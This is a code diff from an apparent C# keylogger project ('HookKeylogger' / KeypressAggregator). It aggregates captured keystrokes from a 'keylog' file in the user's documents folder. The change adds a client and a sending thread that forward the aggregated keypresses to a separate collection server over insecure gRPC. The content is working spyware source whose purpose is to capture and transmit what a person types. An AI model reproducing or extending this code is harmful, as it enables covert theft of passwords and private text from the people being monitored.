@@ -17,9 +17,12 @@ namespace KeypressAggregator
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
             // The new file that holds the extracted data
             string newFile = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\data";
-            int port = 4567;
             string addr = "localhost";
+            int port = 4567;
+            string serveraddr = "localhost";
+            int serverport = 13000;
 
+            // Setup the shared resources
             ConcurrentQueue<KeyPress> inputbuffer = new ConcurrentQueue<KeyPress>();
             ConcurrentQueue<CI> outbuffer = new ConcurrentQueue<CI>();
             Grpc.Core.Server server = new Grpc.Core.Server
@@ -27,19 +30,25 @@ namespace KeypressAggregator
                 Services = { HookKeylogger.Base.KerPressAggergator.BindService(new KeyPressAggergatorImpl(inputbuffer)) },
                 Ports = { new Grpc.Core.ServerPort(addr, port, Grpc.Core.ServerCredentials.Insecure) }
             };
-
-            KeyPressAggergator ksa = new KeyPressAggergator(inputbuffer, outbuffer);
-
+            ServerClient client = new ServerClient(serveraddr, serverport);
+            KeyPressAggergator ksa = new KeyPressAggergator(inputbuffer, client);
             Thread aggergationThread = new Thread(new ThreadStart(ksa.Scan));
+            Thread sendThread = new Thread(new ThreadStart(client.Start));
+
+            // Start threads and server
             aggergationThread.Start();
+            sendThread.Start();
             server.Start();
 
             Console.WriteLine("Key-Press Aggergation server listening on " +addr + ":" + port);
             Console.WriteLine("Press any key to stop the aggregation server...");
             Console.ReadKey();
 
+            // Shutdown and wait for all threads to finish before exiting.
             aggergationThread.Abort();
             aggergationThread.Join();
+            sendThread.Abort();
+            sendThread.Join();
             server.ShutdownAsync();
         }
     }
